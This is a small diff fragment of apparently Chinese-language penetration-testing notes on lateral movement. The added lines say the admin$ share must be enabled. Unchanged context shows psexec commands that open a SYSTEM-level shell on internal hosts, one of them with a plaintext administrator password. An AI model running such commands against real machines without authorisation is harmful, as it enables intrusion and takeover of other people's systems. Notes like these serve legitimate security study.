@@ -41,6 +41,8 @@
      psexec \\192.168.3.64 -s cmd cmd     #   -s,表示以system权限运行窗口，成功返回目标主机system权限窗口
      
     2.ps不需要建立ipc连接进行横向移动
+     
+     前提开启admin$共享
     
      psexec \\192.168.3.144 -u administrator -p admin123！！ -s cmd
      
